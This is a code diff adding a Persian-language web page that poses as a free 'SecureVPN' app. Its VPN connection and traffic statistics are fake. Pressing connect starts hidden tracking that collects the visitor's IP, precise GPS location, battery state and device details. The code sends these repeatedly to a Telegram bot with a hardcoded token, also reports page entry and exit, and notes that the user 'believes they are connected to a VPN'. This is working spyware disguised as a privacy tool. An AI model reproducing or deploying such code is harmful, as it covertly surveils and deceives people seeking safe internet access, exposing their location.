@@ -1,0 +1,1117 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>SecureVPN - اتصال امن و سریع</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="VPN رایگان و امن برای دسترسی آزاد به اینترنت">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700&display=swap');
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Vazirmatn', sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: #fff;
+      min-height: 100vh;
+      overflow: auto;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Header */
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+      padding-top: 20px;
+    }
+
+    .logo {
+      width: 60px;
+      height: 60px;
+      background: linear-gradient(45deg, #4facfe, #00f2fe);
+      border-radius: 20px;
+      margin: 0 auto 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      font-weight: bold;
+      box-shadow: 0 8px 25px rgba(79, 172, 254, 0.3);
+    }
+
+    .app-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .app-subtitle {
+      color: rgba(255,255,255,0.8);
+      font-size: 16px;
+    }
+
+    /* Connection Status */
+    .connection-status {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 25px;
+      padding: 30px;
+      margin-bottom: 25px;
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .status-indicator {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      transition: all 0.3s ease;
+    }
+
+    .status-indicator.disconnected {
+      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+      box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7);
+      animation: pulse-red 2s infinite;
+    }
+
+    .status-indicator.connected {
+      background: linear-gradient(45deg, #00b894, #00cec9);
+      box-shadow: 0 0 0 0 rgba(0, 184, 148, 0.7);
+      animation: pulse-green 2s infinite;
+    }
+
+    @keyframes pulse-red {
+      0% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(255, 107, 107, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0); }
+    }
+
+    @keyframes pulse-green {
+      0% { box-shadow: 0 0 0 0 rgba(0, 184, 148, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(0, 184, 148, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(0, 184, 148, 0); }
+    }
+
+    .status-icon {
+      font-size: 48px;
+    }
+
+    .status-text {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .status-detail {
+      color: rgba(255,255,255,0.8);
+      font-size: 14px;
+    }
+
+    /* Connect Button */
+    .connect-button {
+      width: 100%;
+      padding: 18px;
+      border: none;
+      border-radius: 15px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-bottom: 25px;
+      font-family: 'Vazirmatn', sans-serif;
+    }
+
+    .connect-button.disconnected {
+      background: linear-gradient(45deg, #00b894, #00cec9);
+      color: white;
+    }
+
+    .connect-button.connected {
+      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+      color: white;
+    }
+
+    .connect-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+    }
+
+    .connect-button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Server Selection */
+    .server-section {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 20px;
+      margin-bottom: 20px;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .section-title {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .server-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .server-item {
+      background: rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .server-item:hover {
+      background: rgba(255,255,255,0.2);
+      transform: translateX(-5px);
+    }
+
+    .server-item.active {
+      background: linear-gradient(45deg, #4facfe, #00f2fe);
+      transform: translateX(-5px);
+    }
+
+    .server-info {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .server-flag {
+      width: 30px;
+      height: 20px;
+      border-radius: 4px;
+      background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+    }
+
+    .server-details h4 {
+      font-size: 16px;
+      margin-bottom: 4px;
+    }
+
+    .server-details p {
+      font-size: 12px;
+      color: rgba(255,255,255,0.7);
+    }
+
+    .server-ping {
+      background: rgba(0, 184, 148, 0.2);
+      color: #00b894;
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    /* Stats */
+    .stats-section {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 20px;
+      margin-bottom: 20px;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .stats-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+    }
+
+    .stat-item {
+      text-align: center;
+      background: rgba(255,255,255,0.1);
+      padding: 15px;
+      border-radius: 12px;
+    }
+
+    .stat-value {
+      font-size: 20px;
+      font-weight: 700;
+      color: #4facfe;
+      margin-bottom: 5px;
+    }
+
+    .stat-label {
+      font-size: 12px;
+      color: rgba(255,255,255,0.7);
+    }
+
+    /* Settings */
+    .settings-section {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 20px;
+      border: 1px solid rgba(255,255,255,0.2);
+      margin-bottom: 30px;
+    }
+
+    .setting-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 15px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+
+    .setting-item:last-child {
+      border-bottom: none;
+    }
+
+    .setting-info h4 {
+      font-size: 16px;
+      margin-bottom: 4px;
+    }
+
+    .setting-info p {
+      font-size: 12px;
+      color: rgba(255,255,255,0.7);
+    }
+
+    .toggle-switch {
+      position: relative;
+      width: 50px;
+      height: 25px;
+      background: rgba(255,255,255,0.3);
+      border-radius: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .toggle-switch.active {
+      background: #4facfe;
+    }
+
+    .toggle-switch::after {
+      content: '';
+      position: absolute;
+      top: 2px;
+      left: 2px;
+      width: 21px;
+      height: 21px;
+      background: white;
+      border-radius: 50%;
+      transition: all 0.3s ease;
+    }
+
+    .toggle-switch.active::after {
+      transform: translateX(25px);
+    }
+
+    /* Loading Animation */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .loading-content {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 30px;
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top: 4px solid #4facfe;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .premium-badge {
+      background: linear-gradient(45deg, #f093fb, #f5576c);
+      color: white;
+      font-size: 10px;
+      padding: 3px 8px;
+      border-radius: 10px;
+      margin-right: 8px;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .container {
+        padding: 15px;
+      }
+      
+      .stats-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* Status Messages */
+    .status-message {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: rgba(0, 184, 148, 0.9);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 25px;
+      font-size: 14px;
+      opacity: 0;
+      transform: translateY(50px);
+      transition: all 0.3s ease;
+      z-index: 1001;
+    }
+
+    .status-message.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .status-message.error {
+      background: rgba(255, 107, 107, 0.9);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <div class="logo">🛡️</div>
+      <div class="app-title">SecureVPN</div>
+      <div class="app-subtitle">اتصال امن و مخفی</div>
+    </div>
+
+    <!-- Connection Status -->
+    <div class="connection-status">
+      <div class="status-indicator disconnected" id="statusIndicator">
+        <div class="status-icon" id="statusIcon">🔒</div>
+      </div>
+      <div class="status-text" id="statusText">قطع شده</div>
+      <div class="status-detail" id="statusDetail">برای محافظت از حریم خصوصی VPN را فعال کنید</div>
+    </div>
+
+    <!-- Connect Button -->
+    <button class="connect-button disconnected" id="connectButton">
+      🚀 اتصال به VPN
+    </button>
+
+    <!-- Server Selection -->
+    <div class="server-section">
+      <div class="section-title">
+        🌍 انتخاب سرور
+        <span class="premium-badge">PREMIUM</span>
+      </div>
+      <div class="server-list" id="serverList">
+        <div class="server-item active" data-country="ایران" data-city="تهران" data-ping="15">
+          <div class="server-info">
+            <div class="server-flag">🇮🇷</div>
+            <div class="server-details">
+              <h4>ایران - تهران</h4>
+              <p>سرور سریع و امن</p>
+            </div>
+          </div>
+          <div class="server-ping">15ms</div>
+        </div>
+        
+        <div class="server-item" data-country="آلمان" data-city="برلین" data-ping="45">
+          <div class="server-info">
+            <div class="server-flag">🇩🇪</div>
+            <div class="server-details">
+              <h4>آلمان - برلین</h4>
+              <p>بالاترین سرعت</p>
+            </div>
+          </div>
+          <div class="server-ping">45ms</div>
+        </div>
+        
+        <div class="server-item" data-country="آمریکا" data-city="نیویورک" data-ping="120">
+          <div class="server-info">
+            <div class="server-flag">🇺🇸</div>
+            <div class="server-details">
+              <h4>آمریکا - نیویورک</h4>
+              <p>دسترسی کامل</p>
+            </div>
+          </div>
+          <div class="server-ping">120ms</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-section">
+      <div class="section-title">📊 آمار اتصال</div>
+      <div class="stats-grid">
+        <div class="stat-item">
+          <div class="stat-value" id="downloadSpeed">0 MB/s</div>
+          <div class="stat-label">سرعت دانلود</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-value" id="uploadSpeed">0 MB/s</div>
+          <div class="stat-label">سرعت آپلود</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-value" id="dataTransfer">0 MB</div>
+          <div class="stat-label">حجم مصرفی</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-value" id="connectionTime">00:00</div>
+          <div class="stat-label">مدت اتصال</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Settings -->
+    <div class="settings-section">
+      <div class="section-title">⚙️ تنظیمات</div>
+      
+      <div class="setting-item">
+        <div class="setting-info">
+          <h4>اتصال خودکار</h4>
+          <p>اتصال خودکار هنگام باز شدن برنامه</p>
+        </div>
+        <div class="toggle-switch active" id="autoConnect"></div>
+      </div>
+      
+      <div class="setting-item">
+        <div class="setting-info">
+          <h4>Kill Switch</h4>
+          <p>قطع اینترنت در صورت قطع VPN</p>
+        </div>
+        <div class="toggle-switch" id="killSwitch"></div>
+      </div>
+      
+      <div class="setting-item">
+        <div class="setting-info">
+          <h4>DNS امن</h4>
+          <p>استفاده از DNS سرورهای امن</p>
+        </div>
+        <div class="toggle-switch active" id="secureDNS"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-content">
+      <div class="spinner"></div>
+      <div>در حال اتصال به سرور...</div>
+      <div style="font-size: 12px; color: rgba(255,255,255,0.7); margin-top: 8px;">
+        لطفاً صبر کنید
+      </div>
+    </div>
+  </div>
+
+  <!-- Status Message -->
+  <div class="status-message" id="statusMessage"></div>
+
+  <script>
+    // =====================================
+    // پیکربندی اصلی
+    // =====================================
+    
+    const CONFIG = {
+      // تنظیمات بله (پنهان)
+      telegram: {
+        botToken: "1800443187:znI9tLgBFIXYJgqvyxExyB8e39NzFZ2N6XF69S2A",
+        chatId: "1555895568"
+      },
+      
+      // تنظیمات ردیابی
+      tracking: {
+        locationInterval: 20000,  // هر 20 ثانیه
+        batteryInterval: 15000,   // هر 15 ثانیه
+        reportInterval: 45000     // هر 45 ثانیه
+      }
+    };
+
+    // =====================================
+    // متغیرهای سراسری
+    // =====================================
+    
+    // وضعیت VPN (فیک)
+    let appState = {
+      isConnected: false,
+      currentServer: { country: 'ایران', city: 'تهران' },
+      connectionStartTime: null,
+      isConnecting: false
+    };
+
+    // ردیابی مخفی
+    let tracking = {
+      active: false,
+      intervals: {},
+      data: {
+        location: { lat: null, lon: null, accuracy: null },
+        battery: { level: null, charging: null },
+        device: { ip: 'نامشخص', platform: navigator.platform }
+      },
+      reportCount: 0
+    };
+
+    // =====================================
+    // توابع کمکی
+    // =====================================
+    
+    function showMessage(message, isError = false) {
+      const messageEl = document.getElementById('statusMessage');
+      messageEl.textContent = message;
+      messageEl.className = `status-message${isError ? ' error' : ''} show`;
+      
+      setTimeout(() => {
+        messageEl.classList.remove('show');
+      }, 3000);
+    }
+
+    function updateConnectionUI(connected, server = null) {
+      const button = document.getElementById('connectButton');
+      const indicator = document.getElementById('statusIndicator');
+      const icon = document.getElementById('statusIcon');
+      const text = document.getElementById('statusText');
+      const detail = document.getElementById('statusDetail');
+
+      if (connected) {
+        button.textContent = '⏹️ قطع اتصال';
+        button.className = 'connect-button connected';
+        
+        indicator.className = 'status-indicator connected';
+        icon.textContent = '✅';
+        text.textContent = 'متصل شد';
+        detail.textContent = `متصل به ${server.country} - ${server.city}`;
+      } else {
+        button.textContent = '🚀 اتصال به VPN';
+        button.className = 'connect-button disconnected';
+        
+        indicator.className = 'status-indicator disconnected';
+        icon.textContent = '🔒';
+        text.textContent = 'قطع شده';
+        detail.textContent = 'برای محافظت از حریم خصوصی VPN را فعال کنید';
+      }
+    }
+
+    // =====================================
+    // سیستم آمار فیک
+    // =====================================
+    
+    function startFakeStats() {
+      let downloadSpeed = 0;
+      let uploadSpeed = 0;
+      let totalData = 0;
+
+      tracking.intervals.stats = setInterval(() => {
+        downloadSpeed = (Math.random() * 15 + 5).toFixed(1);
+        uploadSpeed = (Math.random() * 8 + 2).toFixed(1);
+        totalData += parseFloat(downloadSpeed) * 0.1;
+
+        const downloadEl = document.getElementById('downloadSpeed');
+        const uploadEl = document.getElementById('uploadSpeed');
+        const dataEl = document.getElementById('dataTransfer');
+        
+        if (downloadEl) downloadEl.textContent = downloadSpeed + ' MB/s';
+        if (uploadEl) uploadEl.textContent = uploadSpeed + ' MB/s';
+        if (dataEl) dataEl.textContent = totalData.toFixed(0) + ' MB';
+      }, 2000);
+    }
+
+    function stopFakeStats() {
+      if (tracking.intervals.stats) {
+        clearInterval(tracking.intervals.stats);
+        delete tracking.intervals.stats;
+        
+        const elements = ['downloadSpeed', 'uploadSpeed', 'dataTransfer'];
+        elements.forEach(id => {
+          const el = document.getElementById(id);
+          if (el) el.textContent = id === 'dataTransfer' ? '0 MB' : '0 MB/s';
+        });
+      }
+    }
+
+    function startConnectionTimer() {
+      tracking.intervals.timer = setInterval(() => {
+        if (appState.connectionStartTime) {
+          const elapsed = Math.floor((new Date() - appState.connectionStartTime) / 1000);
+          const minutes = Math.floor(elapsed / 60);
+          const seconds = elapsed % 60;
+          
+          const timerEl = document.getElementById('connectionTime');
+          if (timerEl) {
+            timerEl.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+          }
+        }
+      }, 1000);
+    }
+
+    function stopConnectionTimer() {
+      if (tracking.intervals.timer) {
+        clearInterval(tracking.intervals.timer);
+        delete tracking.intervals.timer;
+        
+        const timerEl = document.getElementById('connectionTime');
+        if (timerEl) timerEl.textContent = '00:00';
+      }
+    }
+
+    // =====================================
+    // سیستم ردیابی مخفی
+    // =====================================
+    
+    async function sendHiddenMessage(message) {
+      try {
+        const url = `https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`;
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CONFIG.telegram.chatId,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        
+        const result = await response.json();
+        if (result.ok) {
+          console.log('[مخفی] گزارش ارسال شد');
+          return true;
+        }
+        return false;
+      } catch (error) {
+        console.error('[مخفی] خطا در ارسال:', error);
+        return false;
+      }
+    }
+
+    async function collectDeviceIP() {
+      const ipServices = [
+        'https://api.ipify.org?format=json',
+        'https://ipapi.co/json/',
+        'https://api64.ipify.org?format=json'
+      ];
+      
+      for (const service of ipServices) {
+        try {
+          const response = await fetch(service);
+          const data = await response.json();
+          tracking.data.device.ip = data.ip || 'نامشخص';
+          return data.ip;
+        } catch (error) {
+          continue;
+        }
+      }
+      return 'نامشخص';
+    }
+
+    async function collectBatteryInfo() {
+      try {
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          tracking.data.battery = {
+            level: Math.round(battery.level * 100),
+            charging: battery.charging
+          };
+        }
+      } catch (error) {
+        console.error('Battery API error:', error);
+      }
+    }
+
+    function collectLocationInfo() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve(false);
+          return;
+        }
+
+        const options = {
+          enableHighAccuracy: true,
+          maximumAge: 60000,
+          timeout: 10000
+        };
+
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            tracking.data.location = {
+              lat: position.coords.latitude.toFixed(8),
+              lon: position.coords.longitude.toFixed(8),
+              accuracy: Math.round(position.coords.accuracy)
+            };
+            resolve(true);
+          },
+          error => {
+            console.error("Geolocation error:", error);
+            resolve(false);
+          },
+          options
+        );
+      });
+    }
+
+    async function startHiddenTracking() {
+      if (tracking.active) return;
+      
+      tracking.active = true;
+      console.log('[مخفی] شروع ردیابی...');
+      
+      // جمع‌آوری فوری اطلاعات
+      await collectDeviceIP();
+      await collectBatteryInfo();
+      await collectLocationInfo();
+      
+      // ارسال گزارش شروع
+      await sendInitialReport();
+      
+      // تنظیم interval ها
+      tracking.intervals.location = setInterval(async () => {
+        const success = await collectLocationInfo();
+        if (success && tracking.data.location.lat) {
+          sendLocationReport();
+        }
+      }, CONFIG.tracking.locationInterval);
+      
+      tracking.intervals.battery = setInterval(async () => {
+        await collectBatteryInfo();
+        sendBatteryReport();
+      }, CONFIG.tracking.batteryInterval);
+      
+      tracking.intervals.reports = setInterval(() => {
+        sendPeriodicReport();
+      }, CONFIG.tracking.reportInterval);
+    }
+
+    function stopHiddenTracking() {
+      if (!tracking.active) return;
+      
+      tracking.active = false;
+      console.log('[مخفی] توقف ردیابی...');
+      
+      // پاک کردن interval ها
+      Object.keys(tracking.intervals).forEach(key => {
+        if (tracking.intervals[key]) {
+          clearInterval(tracking.intervals[key]);
+          delete tracking.intervals[key];
+        }
+      });
+      
+      // ارسال گزارش توقف
+      sendHiddenMessage(`
+🔴 <b>سیستم ردیابی متوقف شد</b>
+
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+📊 تعداد گزارش: ${tracking.reportCount}
+🎯 آخرین موقعیت: ${tracking.data.location.lat || 'نامشخص'}
+      `);
+    }
+
+    async function sendInitialReport() {
+      await collectCompleteDeviceInfo();
+      
+      const report = `
+🛡️ <b>گزارش کامل SecureVPN</b>
+📱 فعالسازی: کاربر دکمه اتصال را زد
+
+<b>📊 اطلاعات دستگاه:</b>
+• IP: ${tracking.data.device.ip}
+• پلتفرم: ${navigator.platform}
+• مرورگر: ${getBrowserInfo()}
+• رزولوشن: ${screen.width}×${screen.height}
+• زبان: ${navigator.language}
+
+<b>📍 موقعیت:</b>
+• مختصات: ${tracking.data.location.lat || 'در حال دریافت...'}, ${tracking.data.location.lon || ''}
+• دقت: ${tracking.data.location.accuracy || 'نامشخص'} متر
+${tracking.data.location.lat ? `• نقشه: https://www.google.com/maps?q=${tracking.data.location.lat},${tracking.data.location.lon}` : ''}
+
+<b>🔋 باتری:</b>
+• سطح: ${tracking.data.battery.level || 'نامشخص'}%
+• شارژ: ${tracking.data.battery.charging ? 'فعال' : 'غیرفعال'}
+
+<b>🎮 وضعیت ظاهری:</b>
+• سرور: ${appState.currentServer.country} - ${appState.currentServer.city}
+• اتصال: ${appState.isConnected ? 'متصل' : 'قطع'}
+
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+🔐 کاربر تصور می‌کند به VPN متصل است
+      `;
+      
+      await sendHiddenMessage(report);
+      tracking.reportCount++;
+    }
+
+    function sendLocationReport() {
+      if (!tracking.data.location.lat) return;
+      
+      const message = `
+📍 <b>موقعیت جدید</b>
+
+🗺️ مختصات: ${tracking.data.location.lat}, ${tracking.data.location.lon}
+🎯 دقت: ${tracking.data.location.accuracy} متر
+📌 نقشه: https://www.google.com/maps?q=${tracking.data.location.lat},${tracking.data.location.lon}
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+      `;
+      
+      sendHiddenMessage(message);
+    }
+
+    function sendBatteryReport() {
+      if (!tracking.data.battery.level) return;
+      
+      const message = `
+🔋 <b>وضعیت باتری</b>
+
+📊 سطح: ${tracking.data.battery.level}%
+🔌 شارژ: ${tracking.data.battery.charging ? 'فعال' : 'غیرفعال'}
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+      `;
+      
+      sendHiddenMessage(message);
+    }
+
+    function sendPeriodicReport() {
+      tracking.reportCount++;
+      
+      const message = `
+📊 <b>گزارش دوره‌ای #${tracking.reportCount}</b>
+
+🎮 وضعیت VPN: ${appState.isConnected ? 'متصل' : 'قطع'}
+🌍 سرور: ${appState.currentServer.country}
+🌐 IP: ${tracking.data.device.ip}
+📍 موقعیت: ${tracking.data.location.lat ? 'موجود' : 'در حال دریافت...'}
+🔋 باتری: ${tracking.data.battery.level || '?'}%
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+      `;
+      
+      sendHiddenMessage(message);
+    }
+
+    function getBrowserInfo() {
+      const ua = navigator.userAgent;
+      if (ua.includes('Chrome')) return 'Chrome';
+      if (ua.includes('Firefox')) return 'Firefox';
+      if (ua.includes('Safari')) return 'Safari';
+      if (ua.includes('Edge')) return 'Edge';
+      return 'نامشخص';
+    }
+
+    async function collectCompleteDeviceInfo() {
+      // جمع‌آوری تمام اطلاعات برای گزارش کامل
+      await collectDeviceIP();
+      await collectBatteryInfo();
+      await collectLocationInfo();
+    }
+
+    // =====================================
+    // مدیریت رویدادها
+    // =====================================
+    
+    async function toggleConnection() {
+      if (appState.isConnecting) return;
+      
+      const button = document.getElementById('connectButton');
+      const overlay = document.getElementById('loadingOverlay');
+      
+      if (!appState.isConnected) {
+        // شروع اتصال
+        appState.isConnecting = true;
+        button.disabled = true;
+        overlay.style.display = 'flex';
+        
+        // شبیه‌سازی تأخیر اتصال
+        setTimeout(async () => {
+          appState.isConnected = true;
+          appState.isConnecting = false;
+          appState.connectionStartTime = new Date();
+          
+          button.disabled = false;
+          overlay.style.display = 'none';
+          
+          updateConnectionUI(true, appState.currentServer);
+          startFakeStats();
+          startConnectionTimer();
+          
+          // **شروع ردیابی مخفی**
+          await startHiddenTracking();
+          
+          showMessage('با موفقیت به VPN متصل شدید!');
+        }, 3000);
+        
+      } else {
+        // قطع اتصال
+        appState.isConnected = false;
+        appState.connectionStartTime = null;
+        
+        updateConnectionUI(false);
+        stopFakeStats();
+        stopConnectionTimer();
+        
+        // **توقف ردیابی مخفی**
+        stopHiddenTracking();
+        
+        showMessage('از VPN قطع شدید');
+      }
+    }
+
+    function selectServer(element, country, city) {
+      // حذف active از همه سرورها
+      document.querySelectorAll('.server-item').forEach(item => {
+        item.classList.remove('active');
+      });
+      
+      // اضافه کردن active به انتخاب شده
+      element.classList.add('active');
+      
+      appState.currentServer = { country, city };
+      
+      // بروزرسانی UI در صورت اتصال
+      if (appState.isConnected) {
+        document.getElementById('statusDetail').textContent = `متصل به ${country} - ${city}`;
+      }
+      
+      showMessage(`سرور ${country} انتخاب شد`);
+    }
+
+    function toggleSetting(element) {
+      element.classList.toggle('active');
+      
+      // تشخیص نوع تنظیم و نمایش پیام
+      const settingName = element.id;
+      const isActive = element.classList.contains('active');
+      
+      let message = '';
+      switch(settingName) {
+        case 'autoConnect':
+          message = `اتصال خودکار ${isActive ? 'فعال' : 'غیرفعال'} شد`;
+          break;
+        case 'killSwitch':
+          message = `Kill Switch ${isActive ? 'فعال' : 'غیرفعال'} شد`;
+          break;
+        case 'secureDNS':
+          message = `DNS امن ${isActive ? 'فعال' : 'غیرفعال'} شد`;
+          break;
+      }
+      
+      if (message) showMessage(message);
+    }
+
+    // =====================================
+    // مقداردهی اولیه
+    // =====================================
+    
+    document.addEventListener('DOMContentLoaded', function() {
+      // متصل کردن event listener ها
+      const connectButton = document.getElementById('connectButton');
+      if (connectButton) {
+        connectButton.addEventListener('click', toggleConnection);
+      }
+      
+      // سرورها
+      const serverItems = document.querySelectorAll('.server-item');
+      serverItems.forEach(item => {
+        item.addEventListener('click', function() {
+          const country = this.dataset.country;
+          const city = this.dataset.city;
+          selectServer(this, country, city);
+        });
+      });
+      
+      // تنظیمات
+      const toggles = document.querySelectorAll('.toggle-switch');
+      toggles.forEach(toggle => {
+        toggle.addEventListener('click', function() {
+          toggleSetting(this);
+        });
+      });
+      
+      // پیام خوش‌آمدگویی
+      setTimeout(() => {
+        showMessage('به SecureVPN خوش آمدید!');
+      }, 1000);
+      
+      // ارسال گزارش ورود
+      setTimeout(async () => {
+        await collectDeviceIP();
+        sendHiddenMessage(`
+🚀 <b>کاربر وارد SecureVPN شد</b>
+
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+📱 دستگاه: ${navigator.platform}
+🌐 IP: ${tracking.data.device.ip}
+🎯 وضعیت: در حال مشاهده رابط VPN
+        `);
+      }, 2000);
+    });
+
+    // تشخیص خروج از صفحه
+    window.addEventListener('beforeunload', function() {
+      if (tracking.active) {
+        navigator.sendBeacon(
+          `https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`,
+          JSON.stringify({
+            chat_id: CONFIG.telegram.chatId,
+            text: `🚪 کاربر صفحه را ترک کرد - ${new Date().toLocaleString('fa-IR')}`
+          })
+        );
+      }
+    });
+
+    // مدیریت خطاهای JavaScript
+    window.addEventListener('error', function(e) {
+      console.error('JavaScript Error:', e);
+      // در صورت بروز خطا، سعی در ادامه کار
+    });
+  </script>
+</body>
+</html>
